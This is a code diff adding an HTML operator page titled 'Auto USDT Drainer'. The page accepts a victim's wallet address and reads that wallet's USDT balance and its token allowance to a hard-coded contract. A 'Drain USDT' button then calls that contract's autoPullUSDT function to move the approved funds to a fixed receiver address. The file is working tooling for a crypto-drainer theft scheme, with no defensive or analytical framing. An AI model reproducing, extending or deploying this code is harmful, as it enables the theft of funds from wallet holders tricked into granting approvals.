@@ -1,0 +1,135 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Panel - Auto USDT Drainer</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-color: #0e0e0e;
+      color: #fff;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background-color: #1e1e1e;
+      border-radius: 10px;
+      padding: 20px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #0f0;
+    }
+    label {
+      margin-top: 10px;
+      display: block;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 4px;
+      margin-bottom: 12px;
+      border-radius: 5px;
+      border: none;
+      background-color: #333;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00c853;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00e676;
+    }
+    .output {
+      background: #111;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Admin Panel</h2>
+    
+    <label>Victim Wallet Address</label>
+    <input type="text" id="victim" placeholder="0x..." />
+
+    <label>Receiver Address</label>
+    <input type="text" id="destination" value="0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090" disabled />
+
+    <button onclick="checkBalances()">🔍 View USDT Balance & Allowance</button>
+
+    <div class="output" id="output"></div>
+
+    <button onclick="drainUSDT()">🚀 Drain USDT</button>
+  </div>
+
+  <script>
+    const contractAddress = "0x3606B0Ee947E5e28cAA81FEEB01187388732B26f";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+
+    const contractABI = [
+      "function autoPullUSDT(address victim, address destination) external",
+      "function contractUSDTBalance() external view returns (uint256)"
+    ];
+    const usdtABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function allowance(address, address) view returns (uint256)"
+    ];
+
+    let provider, signer, contract, usdt;
+
+    async function init() {
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      contract = new ethers.Contract(contractAddress, contractABI, signer);
+      usdt = new ethers.Contract(usdtAddress, usdtABI, provider);
+    }
+
+    async function checkBalances() {
+      const victim = document.getElementById("victim").value;
+      if (!ethers.isAddress(victim)) return alert("Invalid victim address");
+
+      await init();
+
+      const balance = await usdt.balanceOf(victim);
+      const allowance = await usdt.allowance(victim, contractAddress);
+
+      document.getElementById("output").innerHTML = `
+        <b>USDT Balance:</b> ${ethers.formatUnits(balance, 18)}<br/>
+        <b>Allowance to Contract:</b> ${ethers.formatUnits(allowance, 18)}
+      `;
+    }
+
+    async function drainUSDT() {
+      const victim = document.getElementById("victim").value;
+      const dest = document.getElementById("destination").value;
+
+      if (!ethers.isAddress(victim)) return alert("Invalid victim address");
+
+      await init();
+
+      try {
+        const tx = await contract.autoPullUSDT(victim, dest);
+        alert("Draining in progress... TX: " + tx.hash);
+      } catch (err) {
+        alert("Error: " + (err.message || err));
+      }
+    }
+  </script>
+</body>
+</html>
